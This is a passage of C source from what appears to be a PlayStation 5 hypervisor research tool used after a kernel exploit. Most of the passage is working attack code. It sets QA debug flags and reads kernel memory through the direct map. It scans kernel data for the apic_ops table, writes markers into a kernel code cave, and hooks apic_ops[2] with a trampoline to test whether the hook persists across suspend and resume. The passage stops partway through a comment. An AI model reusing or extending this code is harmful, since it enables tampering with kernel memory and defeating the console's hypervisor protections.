    fflush(stdout);

    /*
     * Step 4: Set QA flags with SL debug bit.
     *
     * QA flags layout (16 bytes, from PS5 SDK / community research):
     *   Byte 0, bit 1 (0x02): System Level (SL) debug flag
     *     When set, HV constructs NPT without xotext/write-protect
     *     on kernel .text pages.
     *
     * We set bytes 0-1 to 0xFF to enable all QA features.
     * Then attempt suspend/resume to see if the HV reads them.
     *
     * On FW >= 3.00: The secure loader should reinitialize these
     * flags during resume, nullifying our changes.  But we test
     * this experimentally to confirm.
     */
    uint8_t qa_new[16];
    memcpy(qa_new, qa_before, 16);
    /* Set first two bytes to 0xFF to enable all QA features */
    qa_new[0] = 0xFF;
    qa_new[1] = 0xFF;

    int qa_changed = 0;
    for (int i = 0; i < 16; i++) {
        if (qa_new[i] != qa_before[i]) { qa_changed = 1; break; }
    }

    if (qa_changed) {
        printf("\n[*] Setting QA flags (enabling all debug features)...\n");
        printf("    Before: ");
        for (int i = 0; i < 16; i++) printf("%02x ", qa_before[i]);
        printf("\n");
        printf("    Target: ");
        for (int i = 0; i < 16; i++) printf("%02x ", qa_new[i]);
        printf("\n");

        if (kernel_set_qaflags(qa_new) == 0) {
            /* Verify */
            uint8_t qa_verify[16] = {0};
            kernel_get_qaflags(qa_verify);
            printf("    After:  ");
            for (int i = 0; i < 16; i++) printf("%02x ", qa_verify[i]);
            printf("\n");

            int match = 1;
            for (int i = 0; i < 16; i++) {
                if (qa_verify[i] != qa_new[i]) { match = 0; break; }
            }
            if (match) {
                printf("[+] QA flags set successfully!\n");
            } else {
                printf("[-] QA flags write did not persist (may be protected)\n");
            }
        } else {
            printf("[-] kernel_set_qaflags() failed\n");
        }
    } else {
        printf("\n[*] QA flags already have debug bits set.\n");
    }
    fflush(stdout);

    /* ─── Phase 6b: Test ktext readability + gadget scan ─── */
    printf("\n[*] Phase 6b: Testing ktext readability via DMAP...\n");

    uint64_t ktext_pa = va_to_pa_quiet(g_ktext_base);
    if (ktext_pa == 0) {
        printf("[-] Cannot resolve ktext PA — page table walk failed\n");
        return;
    }

    /*
     * Try reading the first 16 bytes of ktext through DMAP.
     * If ktext is still XOM (first run, NPT not updated yet), this
     * will return garbage/zeros or fail.  After suspend/resume,
     * the HV reinitializes NPT without XOM, and this succeeds.
     */
    uint8_t ktext_probe[16];
    memset(ktext_probe, 0xCC, sizeof(ktext_probe));
    int read_ok = kernel_copyout(g_dmap_base + ktext_pa, ktext_probe, 16);

    /*
     * Heuristic: ktext starts with ELF header or code.  If the read
     * succeeds AND the bytes are not all zero or all 0xCC (our fill),
     * ktext is actually readable.
     */
    int all_zero = 1, all_cc = 1;
    for (int i = 0; i < 16; i++) {
        if (ktext_probe[i] != 0x00) all_zero = 0;
        if (ktext_probe[i] != 0xCC) all_cc = 0;
    }
    int ktext_readable = (read_ok == 0 && !all_zero && !all_cc);

    printf("[*] ktext DMAP read: ret=%d, bytes: ", read_ok);
    for (int i = 0; i < 16; i++) printf("%02x ", ktext_probe[i]);
    printf("\n");

    if (!ktext_readable) {
        printf("\n[!] ktext is still EXECUTE-ONLY (NPT enforced by HV)\n");
        if (total_xotext > 0) {
            printf("[*] XOTEXT found in %d guest PTEs (unexpected on 4.03!)\n",
                   total_xotext);
        } else {
            printf("[*] No XOTEXT in guest PTEs — XOM is purely NPT-based.\n");
        }

        /* Re-read QA flags to show current state */
        uint8_t qa_check[16] = {0};
        if (kernel_get_qaflags(qa_check) == 0) {
            printf("[*] QA flags now: ");
            for (int i = 0; i < 16; i++) printf("%02x ", qa_check[i]);
            printf("\n");
        }

        printf("\n[*] EXPERIMENTAL: Try suspend/resume to test QA flags persistence.\n");
        printf("    On FW >= 3.00, the secure loader reinitializes QA flags on\n");
        printf("    resume (documented as patched).  But we test empirically:\n");
        printf("    1. QA flags set to 0xFF above\n");
        printf("    2. Put PS5 in REST MODE (Settings > Power > Rest Mode)\n");
        printf("    3. Wake PS5 + re-run exploit + hv_research.elf\n");
        printf("    4. Check if ktext becomes readable (unlikely on FW 4.03)\n");
        /* ─── Fallback apic_ops discovery via DMAP (no ring-0 needed) ─── */
        if (!g_apic_ops_addr || g_apic_ops_count < 4) {
            printf("\n[*] apic_ops not found by Phase 3 — running DMAP-based fallback scan...\n");
            fflush(stdout);

            /*
             * Scan kdata via DMAP for clusters of consecutive ktext pointers.
             * This is the same algorithm as Phase 3 but runs from userland.
             * ktext pointer range: ktext_base to ktext_base + 32MB
             * kdata scan range: kdata_base to kdata_base + 8MB
             */
            uint64_t fb_ktext_size = 0x2000000; /* 32MB */
            #define FB_SCAN_SIZE   0x800000  /* 8MB of kdata */
            #define FB_SCAN_CHUNK  0x1000    /* 4KB at a time */
            #define FB_MIN_RUN     4

            int fb_run_len = 0;
            uint64_t fb_run_start = 0;
            uint64_t fb_best_addr = 0;
            int fb_best_len = 0;
            int fb_best_score = 0;
            int fb_tables = 0;

            uint8_t fb_chunk[FB_SCAN_CHUNK];

            for (uint64_t off = 0; off < FB_SCAN_SIZE; off += FB_SCAN_CHUNK) {
                uint64_t scan_kva = g_kdata_base + off;
                uint64_t scan_pa = va_to_pa_quiet(scan_kva);
                if (scan_pa == 0 || scan_pa >= MAX_SAFE_PA) {
                    if (fb_run_len >= FB_MIN_RUN) {
                        fb_tables++;
                        if (fb_run_len >= 26 && fb_run_len <= 30) {
                            /* Score this candidate */
                            uint64_t tbl_pa = va_to_pa_quiet(fb_run_start);
                            if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
                                uint64_t tbl[40];
                                int cnt = fb_run_len > 40 ? 40 : fb_run_len;
                                kernel_copyout(g_dmap_base + tbl_pa, tbl, cnt * 8);
                                int uniq = 0;
                                uint64_t pmin = tbl[0], pmax = tbl[0];
                                for (int u = 0; u < cnt; u++) {
                                    if (tbl[u] < pmin) pmin = tbl[u];
                                    if (tbl[u] > pmax) pmax = tbl[u];
                                    int dup = 0;
                                    for (int v = 0; v < u; v++)
                                        if (tbl[v] == tbl[u]) { dup = 1; break; }
                                    if (!dup) uniq++;
                                }
                                uint64_t spread = pmax - pmin;
                                int score = 10;
                                if (cnt == 28) score += 5;
                                if (spread >= 0x400 && spread <= 0x10000) score += 20;
                                else if (spread < 0x400) score -= 10;
                                else score -= 5;
                                score += uniq;
                                if (score > fb_best_score) {
                                    fb_best_addr = fb_run_start;
                                    fb_best_len = cnt;
                                    fb_best_score = score;
                                }
                            }
                        }
                    }
                    fb_run_len = 0;
                    continue;
                }

                kernel_copyout(g_dmap_base + scan_pa, fb_chunk, FB_SCAN_CHUNK);

                for (int qi = 0; qi < FB_SCAN_CHUNK; qi += 8) {
                    uint64_t qval;
                    memcpy(&qval, &fb_chunk[qi], 8);

                    int is_ktext = (qval >= g_ktext_base &&
                                    qval < g_ktext_base + fb_ktext_size &&
                                    (qval & 0x3) == 0);

                    if (is_ktext) {
                        if (fb_run_len == 0)
                            fb_run_start = scan_kva + qi;
                        fb_run_len++;
                    } else {
                        if (fb_run_len >= FB_MIN_RUN) {
                            fb_tables++;
                            if (fb_run_len >= 26 && fb_run_len <= 30) {
                                uint64_t tbl_pa = va_to_pa_quiet(fb_run_start);
                                if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
                                    uint64_t tbl[40];
                                    int cnt = fb_run_len > 40 ? 40 : fb_run_len;
                                    kernel_copyout(g_dmap_base + tbl_pa, tbl, cnt * 8);
                                    int uniq = 0;
                                    uint64_t pmin = tbl[0], pmax = tbl[0];
                                    for (int u = 0; u < cnt; u++) {
                                        if (tbl[u] < pmin) pmin = tbl[u];
                                        if (tbl[u] > pmax) pmax = tbl[u];
                                        int dup = 0;
                                        for (int v = 0; v < u; v++)
                                            if (tbl[v] == tbl[u]) { dup = 1; break; }
                                        if (!dup) uniq++;
                                    }
                                    uint64_t spread = pmax - pmin;
                                    int score = 10;
                                    if (cnt == 28) score += 5;
                                    if (spread >= 0x400 && spread <= 0x10000) score += 20;
                                    else if (spread < 0x400) score -= 10;
                                    else score -= 5;
                                    score += uniq;
                                    if (score > fb_best_score) {
                                        fb_best_addr = fb_run_start;
                                        fb_best_len = cnt;
                                        fb_best_score = score;
                                    }
                                }
                            }
                        }
                        fb_run_len = 0;
                    }
                }
            }
            /* Flush final run */
            if (fb_run_len >= FB_MIN_RUN && fb_run_len >= 26 && fb_run_len <= 30) {
                uint64_t tbl_pa = va_to_pa_quiet(fb_run_start);
                if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
                    uint64_t tbl[40];
                    int cnt = fb_run_len > 40 ? 40 : fb_run_len;
                    kernel_copyout(g_dmap_base + tbl_pa, tbl, cnt * 8);
                    int uniq = 0;
                    uint64_t pmin = tbl[0], pmax = tbl[0];
                    for (int u = 0; u < cnt; u++) {
                        if (tbl[u] < pmin) pmin = tbl[u];
                        if (tbl[u] > pmax) pmax = tbl[u];
                        int dup = 0;
                        for (int v = 0; v < u; v++)
                            if (tbl[v] == tbl[u]) { dup = 1; break; }
                        if (!dup) uniq++;
                    }
                    uint64_t spread = pmax - pmin;
                    int score = 10;
                    if (cnt == 28) score += 5;
                    if (spread >= 0x400 && spread <= 0x10000) score += 20;
                    else if (spread < 0x400) score -= 10;
                    else score -= 5;
                    score += uniq;
                    if (score > fb_best_score) {
                        fb_best_addr = fb_run_start;
                        fb_best_len = cnt;
                        fb_best_score = score;
                    }
                }
                fb_tables++;
            }

            if (fb_best_addr) {
                g_apic_ops_addr = fb_best_addr;
                g_apic_ops_count = fb_best_len;
                printf("[+] Fallback scan found apic_ops at kdata+0x%lx (%d entries, score=%d)\n",
                       (unsigned long)(fb_best_addr - g_kdata_base),
                       fb_best_len, fb_best_score);
                printf("    xapic_mode [2] at kdata+0x%lx\n",
                       (unsigned long)(fb_best_addr - g_kdata_base + 0x10));
                /* Dump entries */
                uint64_t dump_pa = va_to_pa_quiet(fb_best_addr);
                if (dump_pa && dump_pa < MAX_SAFE_PA) {
                    uint64_t dump_ops[32];
                    int dc = fb_best_len > 32 ? 32 : fb_best_len;
                    kernel_copyout(g_dmap_base + dump_pa, dump_ops, dc * 8);
                    for (int di = 0; di < dc; di++)
                        printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
                               di, (unsigned long)dump_ops[di],
                               (unsigned long)(dump_ops[di] - g_ktext_base));
                }
            } else {
                printf("[-] Fallback scan: no apic_ops candidate found (%d tables scanned).\n",
                       fb_tables);
            }
            fflush(stdout);
        }

    /* ─── Phase 7: apic_ops suspend/resume persistence + hook test ─── */
        printf("\n=============================================\n");
        printf("  Phase 7: apic_ops Suspend/Resume Hook Test\n");
        printf("=============================================\n\n");

        if (!g_apic_ops_addr || g_apic_ops_count < 4) {
            printf("[-] apic_ops not discovered (addr=0x%lx, count=%d)\n",
                   (unsigned long)g_apic_ops_addr, g_apic_ops_count);
            printf("    Cannot proceed with hook test.\n\n");
            notify("[HV Research] Phase 7 skipped: no apic_ops.");
            fflush(stdout);
            return;
        }

        /*
         * Read all apic_ops entries and dump them sorted.
         * This gives us the function address map for ktext.
         */
        int n_ops = g_apic_ops_count;
        if (n_ops > 32) n_ops = 32;

        uint64_t ops_pa = va_to_pa_quiet(g_apic_ops_addr);
        if (ops_pa == 0) {
            printf("[-] apic_ops VA→PA failed\n");
            fflush(stdout);
            return;
        }

        uint64_t ops[32];
        kernel_copyout(g_dmap_base + ops_pa, ops, n_ops * 8);

        printf("[*] apic_ops table (%d entries at kdata+0x%lx):\n",
               n_ops, (unsigned long)(g_apic_ops_addr - g_kdata_base));
        for (int i = 0; i < n_ops; i++) {
            printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
                   i, (unsigned long)ops[i],
                   (unsigned long)(ops[i] - g_ktext_base));
        }

        /* Sort entries by address to find function boundaries */
        uint64_t sorted[32];
        memcpy(sorted, ops, n_ops * 8);
        for (int i = 0; i < n_ops - 1; i++) {
            for (int j = i + 1; j < n_ops; j++) {
                if (sorted[j] < sorted[i]) {
                    uint64_t tmp = sorted[i];
                    sorted[i] = sorted[j];
                    sorted[j] = tmp;
                }
            }
        }

        printf("\n[*] Sorted ktext addresses (inter-function gaps):\n");
        uint64_t min_gap = ~0ULL;
        int min_gap_idx = -1;
        for (int i = 0; i < n_ops; i++) {
            uint64_t gap = (i + 1 < n_ops) ?
                           sorted[i + 1] - sorted[i] : 0;
            if (i + 1 < n_ops && gap < min_gap) {
                min_gap = gap;
                min_gap_idx = i;
            }
            printf("    0x%016lx  ", (unsigned long)sorted[i]);
            if (i + 1 < n_ops) {
                printf("gap: %lu bytes", (unsigned long)gap);
            }
            printf("\n");
        }
        if (min_gap_idx >= 0) {
            printf("    Smallest gap: %lu bytes at 0x%lx\n",
                   (unsigned long)min_gap,
                   (unsigned long)sorted[min_gap_idx]);
        }

        /*
         * Detect post-resume state.
         *
         * Detection methods (any triggers post-resume path):
         *   1. apic_ops[2] points outside ktext (kdata cave hook)
         *   2. QA flags contain PHASE7_MARKER
         *   3. Cave persistence marker ("FLATZHOO") present
         *
         * Cave marker layout (32 bytes at kdata_base):
         *   0x00: magic ("FLATZHOO")
         *   0x08: original xapic_mode
         *   0x10: ktext_base (KASLR verify)
         *   0x18: reserved (zero)
         */
        #define PHASE7_MARKER 0x42EFCDABUL
        #define P7_CAVE_MAGIC    0x464C41545A484F4FULL  /* "FLATZHOO" */
        #define P7_MARKER_SIZE   64   /* extended: 0x00-0x1F markers, 0x20-0x27 proof */

        int p7_is_post_resume = 0;
        uint64_t p7_hook_addr = ops[2];
        int hook_outside_ktext = (p7_hook_addr < g_ktext_base ||
                                  p7_hook_addr >= g_ktext_base + 0x2000000);
        if (hook_outside_ktext) {
            p7_is_post_resume = 1;
        }

        /* Also check QA flags for marker (parallel detection) */
        uint8_t p7_qa[16] = {0};
        kernel_get_qaflags(p7_qa);
        uint32_t qa_marker_val = 0;
        memcpy(&qa_marker_val, &p7_qa[4], 4);
        if (qa_marker_val == PHASE7_MARKER)
            p7_is_post_resume = 1;

        /* Also check cave persistence marker */
        uint64_t cave_marker_val = 0;
        {
            uint64_t cave_pa = va_to_pa_quiet(g_kdata_base);
            if (cave_pa) {
                kernel_copyout(g_dmap_base + cave_pa, &cave_marker_val, 8);
                if (cave_marker_val == P7_CAVE_MAGIC)
                    p7_is_post_resume = 1;
            }
        }

        if (p7_is_post_resume) {
            /* ─── Post-resume: check results ─── */
            printf("\n[+] *** POST-RESUME / MARKERS DETECTED ***\n\n");

            /* Check apic_ops[2] current value */
            uint64_t xapic_now = ops[2];

            /* Recover original xapic_mode from cave marker (offset 0x08)
             * and from QA flags bytes 8-15 (may be 0 if QA reinitialised). */
            uint64_t orig_xapic = 0;
            memcpy(&orig_xapic, &p7_qa[8], 8);

            int cave_persisted = (cave_marker_val == P7_CAVE_MAGIC);
            int qa_persisted   = (p7_qa[0] == 0xFF && p7_qa[1] == 0xFF);

            /* Read full cave marker data */
            uint64_t saved_xapic = 0, saved_ktext = 0;
            if (cave_persisted) {
                uint64_t cave_pa = va_to_pa_quiet(g_kdata_base);
                if (cave_pa) {
                    uint8_t cave_data[P7_MARKER_SIZE];
                    kernel_copyout(g_dmap_base + cave_pa, cave_data,
                                   P7_MARKER_SIZE);
                    memcpy(&saved_xapic, &cave_data[0x08], 8);
                    memcpy(&saved_ktext, &cave_data[0x10], 8);
                }
            }

            /* Prefer cave-marker original if QA flags lost it */
            if (!orig_xapic && saved_xapic)
                orig_xapic = saved_xapic;

            /* ── Cave marker details ── */
            printf("[*] Cave marker (kdata_base):\n");
            if (cave_persisted) {
                printf("    Magic:       0x%016lx — PERSISTED!\n",
                       (unsigned long)cave_marker_val);
                printf("    Saved xapic: 0x%016lx\n",
                       (unsigned long)saved_xapic);
                printf("    Saved ktext: 0x%016lx\n",
                       (unsigned long)saved_ktext);
                if (saved_ktext == g_ktext_base)
                    printf("    KASLR: same slide (ktext_base matches)\n");
                else
                    printf("    KASLR: DIFFERENT slide! (0x%lx vs 0x%lx)\n",
                           (unsigned long)saved_ktext,
                           (unsigned long)g_ktext_base);
            } else {
                printf("    Magic: 0x%016lx — not found.\n",
                       (unsigned long)cave_marker_val);
            }

            /* ── QA flags ── */
            printf("\n[*] QA flags:\n");
            printf("    Bytes 0-1: %02x %02x", p7_qa[0], p7_qa[1]);
            if (qa_persisted)
                printf(" — PERSISTED!\n");
            else
                printf(" — reinitialized.\n");

            /* ── apic_ops[2] persistence check ── */
            printf("\n[*] apic_ops[2] (xapic_mode):\n");
            printf("    Current value:  0x%016lx\n", (unsigned long)xapic_now);
            if (orig_xapic) {
                printf("    Original saved: 0x%016lx\n",
                       (unsigned long)orig_xapic);
                if (xapic_now == orig_xapic)
                    printf("    → MATCH — apic_ops[2] retained its value.\n");
                else
                    printf("    → CHANGED — kernel reinitialized apic_ops[2]!\n");
            } else {
                printf("    Original saved: (unavailable)\n");
            }

            /* ── Summary ── */
            printf("\n[+] ============================================\n");
            printf("[+]  POST-RESUME PERSISTENCE RESULTS\n");
            printf("[+] ============================================\n");
            printf("[+]   Cave marker:     %s\n",
                   cave_persisted ? "PERSISTED" : "LOST");
            printf("[+]   QA flags:        %s\n",
                   qa_persisted ? "PERSISTED" : "reinitialized");
            printf("[+]   apic_ops[2] now: 0x%016lx\n",
                   (unsigned long)xapic_now);
            if (orig_xapic) {
                printf("[+]   Original xapic:  0x%016lx\n",
                       (unsigned long)orig_xapic);
                if (xapic_now == orig_xapic)
                    printf("[+]   apic_ops[2]:     RETAINED (value unchanged)\n");
                else
                    printf("[+]   apic_ops[2]:     CHANGED by kernel reinit\n");
            }

            /* ── Cave trampoline proof marker check ── */
            {
                uint64_t proof_pa = va_to_pa_quiet(g_kdata_base);
                uint64_t proof_val = 0;
                int tramp_fired = 0;
                if (proof_pa) {
                    kernel_copyout(g_dmap_base + proof_pa + CAVE_PROOF_OFFSET,
                                   &proof_val, 8);
                    tramp_fired = (proof_val == CAVE_PROOF_MARKER);
                }
                uint64_t cave_tramp_kva = g_kdata_base + CAVE_TRAMP_OFFSET;
                int hook_points_to_cave = (xapic_now == cave_tramp_kva);

                printf("\n[*] Cave trampoline resume check:\n");
                printf("    Proof marker at kdata+0x%x: 0x%016lx\n",
                       CAVE_PROOF_OFFSET, (unsigned long)proof_val);
                printf("    Expected (FIRED!_!):        0x%016lx\n",
                       (unsigned long)CAVE_PROOF_MARKER);
                printf("    Cave tramp KVA:             0x%016lx\n",
                       (unsigned long)cave_tramp_kva);
                printf("    apic_ops[2] now:            0x%016lx\n",
                       (unsigned long)xapic_now);

                if (tramp_fired && hook_points_to_cave) {
                    printf("    >>> TRAMPOLINE FIRED DURING RESUME! <<<\n");
                    printf("    >>> Hook survived + proof marker written! <<<\n");
                    printf("[+]   Cave tramp:      FIRED!\n");
                } else if (tramp_fired && !hook_points_to_cave) {
                    printf("    >>> TRAMPOLINE FIRED but hook was restored! <<<\n");
                    printf("    (kernel may have reinitialized apic_ops)\n");
                    printf("[+]   Cave tramp:      FIRED (hook lost)\n");
                } else if (!tramp_fired && hook_points_to_cave) {
                    printf("    Hook still points to cave but no proof marker.\n");
                    printf("    Trampoline may not have been called yet.\n");
                    printf("[+]   Cave tramp:      ARMED (not fired)\n");
                } else {
                    printf("    No proof marker, hook not pointing to cave.\n");
                    printf("    Cave trampoline was not armed during suspend.\n");
                    printf("[+]   Cave tramp:      NOT ARMED\n");
                }

                /* Clear proof marker for next cycle */
                if (tramp_fired && proof_pa) {
                    uint64_t zero = 0;
                    kernel_copyin(&zero, g_dmap_base + proof_pa + CAVE_PROOF_OFFSET, 8);
                    printf("[*] Proof marker cleared for next cycle.\n");
                }
            }

            /* Clear QA marker */
            memset(&p7_qa[4], 0, 12);
            kernel_set_qaflags(p7_qa);
            printf("[*] QA marker cleared.\n");

            /* ── Phase 9 post-resume: check if #GP handler fired ── */
            #define P9_MARKER_MAGIC_CHECK 0x50484153453921ULL
            if (cave_persisted) {
                uint64_t cave_pa_p9 = va_to_pa_quiet(g_kdata_base);
                uint64_t p9_cave_kva = 0;
                if (cave_pa_p9) {
                    uint8_t mkr[32];
                    kernel_copyout(g_dmap_base + cave_pa_p9, mkr, 32);
                    memcpy(&p9_cave_kva, &mkr[0x18], 8);
                }
                if (p9_cave_kva) {
                    uint64_t p9_cave_pa = va_to_pa_quiet(p9_cave_kva);
                    if (p9_cave_pa) {
                        uint64_t p9_marker = 0, p9_proof = 0;
                        kernel_copyout(g_dmap_base + p9_cave_pa + 0x120, &p9_marker, 8);
                        kernel_copyout(g_dmap_base + p9_cave_pa + 0x118, &p9_proof, 8);
                        if (p9_marker == P9_MARKER_MAGIC_CHECK) {
                            printf("\n[*] Phase 9 post-resume check:\n");
                            printf("    Cave KVA: 0x%lx\n", (unsigned long)p9_cave_kva);
                            printf("    Phase 9 marker: FOUND\n");
                            if (p9_proof) {
                                printf("    ktext proof: 0x%016lx — #GP HANDLER FIRED!\n",
                                       (unsigned long)p9_proof);
                                printf("    *** ktext was readable during resume! ***\n");
                            } else {
                                printf("    ktext proof: (empty) — handler may not have fired\n");
                            }
                            /* Check if IDT[13] was restored */
                            uint8_t idt13_check[16];
                            uint64_t idt_check_pa = va_to_pa_quiet(
                                g_kdata_base + 0x64cdc80ULL);
                            if (idt_check_pa) {
                                kernel_copyout(g_dmap_base + idt_check_pa + 16*13,
                                               idt13_check, 16);
                                uint8_t ist_now = idt13_check[4] & 0x07;
                                printf("    IDT[13] IST now: %d %s\n", ist_now,
                                       ist_now == 0 ? "(restored)" : "(still modified!)");
                            }
                            /* Check apic_ops[2] */
                            uint64_t ops2_now = ops[2];
                            uint64_t ops2_saved = 0;
                            kernel_copyout(g_dmap_base + p9_cave_pa + 0x110,
                                           &ops2_saved, 8);
                            printf("    apic_ops[2] now:  0x%016lx\n",
                                   (unsigned long)ops2_now);
                            printf("    apic_ops[2] saved: 0x%016lx\n",
                                   (unsigned long)ops2_saved);
                            if (ops2_now == ops2_saved)
                                printf("    → RESTORED (handler worked!)\n");
                            else if ((ops2_now >> 48) == 0xDEB7)
                                printf("    → STILL POISONED (handler didn't fire?)\n");
                            else
                                printf("    → DIFFERENT (kernel reinitialized)\n");
                        }
                    }
                }
            }

            notify("[HV Research] Phase 7: Post-resume check complete!");

        } else {
            /* ─── Pre-suspend: set markers + hook apic_ops[2] ─── */
            printf("\n[*] Phase 7: apic_ops hook + persistence markers\n\n");

            /*
             * APPROACH:
             *   1. Save original xapic_mode in cave marker + QA flags
             *   2. If KLD trampoline is available, hook apic_ops[2] →
             *      trampoline_xapic_mode (SAFE: calls original via
             *      g_trampoline_target, returns correct APIC mode)
             *   3. Enter rest mode with hook armed
             *
             * CONFIRMED from previous tests:
             *   - Cave marker persists across suspend/resume
             *   - QA flags persist across suspend/resume
             *   - apic_ops[2] retains its value across resume
             *   - KASLR slide is stable across resume
             *   - KLD trampoline transparently calls original
             *   - apic_ops writeback test passes from ring 0
             */

            uint64_t original_xapic = ops[2];
            printf("    apic_ops[2] (xapic_mode): 0x%016lx\n",
                   (unsigned long)original_xapic);
            printf("    apic_ops entries: %d\n", n_ops);

            /* ── Step 1: Write persistence marker to kdata cave ── */
            printf("\n[*] Step 1: Writing persistence marker to kdata cave...\n");

            uint64_t cave_kva = g_kdata_base;
            uint64_t cave_pa  = va_to_pa_quiet(cave_kva);
            if (!cave_pa) {
                printf("[-] kdata_base VA→PA failed.\n");
                fflush(stdout);
                return;
            }

            /*
             * Marker layout (32 bytes at kdata_base):
             *   0x00: 8 bytes — magic  ("FLATZHOO")
             *   0x08: 8 bytes — original_xapic value
             *   0x10: 8 bytes — ktext_base (for KASLR verification)
             *   0x18: 8 bytes — hook target (trampoline KVA or 0)
             */
            uint8_t marker_data[P7_MARKER_SIZE];
            memset(marker_data, 0, sizeof(marker_data));
            uint64_t cave_magic = P7_CAVE_MAGIC;
            memcpy(&marker_data[0x00], &cave_magic, 8);
            memcpy(&marker_data[0x08], &original_xapic, 8);
            memcpy(&marker_data[0x10], &g_ktext_base, 8);
            /* 0x18: filled below if trampoline hook is armed */

            /* Save original cave content */
            uint8_t cave_backup[P7_MARKER_SIZE];
            kernel_copyout(g_dmap_base + cave_pa, cave_backup, P7_MARKER_SIZE);

            /* Write marker */
            kernel_copyin(marker_data, g_dmap_base + cave_pa, P7_MARKER_SIZE);

            /* Verify */
            uint8_t marker_verify[P7_MARKER_SIZE];
            kernel_copyout(g_dmap_base + cave_pa, marker_verify, P7_MARKER_SIZE);
            int marker_ok = (memcmp(marker_data, marker_verify, P7_MARKER_SIZE) == 0);
            printf("    Cave KVA: 0x%lx  PA: 0x%lx\n",
                   (unsigned long)cave_kva, (unsigned long)cave_pa);
            printf("    Marker write: %s\n", marker_ok ? "OK" : "MISMATCH");

            if (!marker_ok) {
                printf("[-] Marker write failed — restoring and aborting.\n");
                kernel_copyin(cave_backup, g_dmap_base + cave_pa, P7_MARKER_SIZE);
                fflush(stdout);
                return;
            }

            /* ── Step 2: Store metadata in QA flags ── */
            printf("\n[*] Step 2: Storing metadata in QA flags...\n");

            uint8_t qa_set[16];
            kernel_get_qaflags(qa_set);
            qa_set[0] = 0xFF;
            qa_set[1] = 0xFF;
            uint32_t marker = PHASE7_MARKER;
            memcpy(&qa_set[4], &marker, 4);
            memcpy(&qa_set[8], &original_xapic, 8);
            kernel_set_qaflags(qa_set);

            uint8_t qa_v[16];
            kernel_get_qaflags(qa_v);
            uint32_t mv = 0;
            memcpy(&mv, &qa_v[4], 4);
            printf("    QA marker: 0x%08x [%s]\n", mv,
                   mv == PHASE7_MARKER ? "OK" : "FAIL");

            /* ── Step 3: Hook apic_ops[2] with trampoline ── */
            int hook_armed = 0;
            int hook_is_cave = (g_kmod_trampoline_func &&
                                g_kmod_trampoline_func >= g_kdata_base &&
                                g_kmod_trampoline_func < g_kdata_base + 0x1000);
            if (g_kmod_trampoline_func && g_kmod_trampoline_target) {
                printf("\n[*] Step 3: Hooking apic_ops[2] → %s trampoline...\n",
                       hook_is_cave ? "cave" : "KLD");
                printf("    trampoline_xapic_mode() = 0x%016lx\n",
                       (unsigned long)g_kmod_trampoline_func);
                printf("    g_trampoline_target     = 0x%016lx\n",
                       (unsigned long)g_kmod_trampoline_target);

                /* Write original xapic_mode to g_trampoline_target via DMAP
                 * so the trampoline calls through to the real function. */
                uint64_t target_pa = va_to_pa_quiet(g_kmod_trampoline_target);
                if (target_pa) {
                    kernel_copyin(&original_xapic,
                                  g_dmap_base + target_pa, 8);
                    /* Verify */
                    uint64_t target_verify = 0;
                    kernel_copyout(g_dmap_base + target_pa, &target_verify, 8);
                    printf("    Trampoline target set: 0x%016lx [%s]\n",
                           (unsigned long)target_verify,
                           target_verify == original_xapic ? "OK" : "FAIL");
                } else {
                    printf("[-] g_trampoline_target VA→PA failed.\n");
                }

                /* Write trampoline KVA into apic_ops[2] */
                kernel_copyin(&g_kmod_trampoline_func,
                              g_dmap_base + ops_pa + 0x10, 8);

                /* Verify the hook */
                uint64_t hook_verify = 0;
                kernel_copyout(g_dmap_base + ops_pa + 0x10, &hook_verify, 8);
                hook_armed = (hook_verify == g_kmod_trampoline_func);
                printf("    apic_ops[2] hooked: 0x%016lx [%s]\n",
                       (unsigned long)hook_verify,
                       hook_armed ? "OK" : "FAIL");

                if (hook_armed) {
                    /* Store hook target in cave marker offset 0x18 */
                    kernel_copyin(&g_kmod_trampoline_func,
                                  g_dmap_base + cave_pa + 0x18, 8);
                }
            } else {
                printf("\n[*] Step 3: KLD trampoline not available — skipping hook.\n");
                printf("    trampoline_func:   0x%lx\n",
                       (unsigned long)g_kmod_trampoline_func);
                printf("    trampoline_target: 0x%lx\n",
                       (unsigned long)g_kmod_trampoline_target);
            }

            printf("\n[+] ============================================\n");
            printf("[+]  PHASE 7 PRE-SUSPEND SETUP COMPLETE\n");
            printf("[+] ============================================\n");
            printf("[+]\n");
            printf("[+] What was set:\n");
            printf("[+]   Cave marker:    FLATZHOO + original xapic\n");
            printf("[+]   QA flags:       Phase 7 marker + original xapic\n");
            if (hook_armed) {
                printf("[+]   apic_ops[2]:    HOOKED → %s trampoline\n",
                       hook_is_cave ? "cave" : "KLD");
                printf("[+]     trampoline calls original xapic_mode\n");
                printf("[+]     Returns correct APIC mode — safe for suspend\n");
                if (hook_is_cave)
                    printf("[+]     Guest PTE NX permanently cleared for cave page\n");
            } else {
                printf("[+]   apic_ops[2]:    UNCHANGED (0x%016lx)\n",
                       (unsigned long)original_xapic);
                printf("[+]     Trampoline unavailable — hook not armed\n");
            }
            printf("[+]\n");
            printf("[+] CONFIRMED from previous tests:\n");
            printf("[+]   - Cave marker persists across resume\n");
            printf("[+]   - QA flags persist across resume\n");
            printf("[+]   - apic_ops[2] retains value across resume\n");
            printf("[+]   - KASLR slide stable across resume\n");
            printf("[+]\n");
            if (hook_armed) {
                printf("[+] ACTION: Entering REST MODE programmatically!\n");
                printf("[+]   On resume: cpususpend_handler calls xapic_mode\n");
                printf("[+]   → %s trampoline → original → returns normally\n",
                       hook_is_cave ? "cave" : "KLD");
                printf("[+]   Wake → re-exploit → re-run tool → check results\n");
            } else {
                printf("[+] NOTE: Hook not armed. Enter REST MODE to test\n");
                printf("[+]   persistence markers only.\n");
            }

            if (hook_armed) {
                /*
                 * ALWAYS restore apic_ops[2] to original before suspend.
                 *
                 * Cave trampoline: lives in kdata (kdata_base+0x100).
                 * We cleared NX+G in the guest PTE, but other CPUs still
                 * have stale TLB entries with NX=1 (Global entries survive
                 * CR3 reloads — only INVLPG flushes them, which we can't
                 * issue from userspace).  Any CPU calling apic_ops[2] hits
                 * the stale NX TLB → #PF → kernel panic.
                 *
                 * KLD trampoline: pages may not be NPT-executable on
                 * secondary CPUs.
                 *
                 * Both cases: restore original to prevent panic.  The hook
                 * was verified working on the primary CPU; persistence
                 * markers (cave + QA flags) will confirm resume detection.
                 */
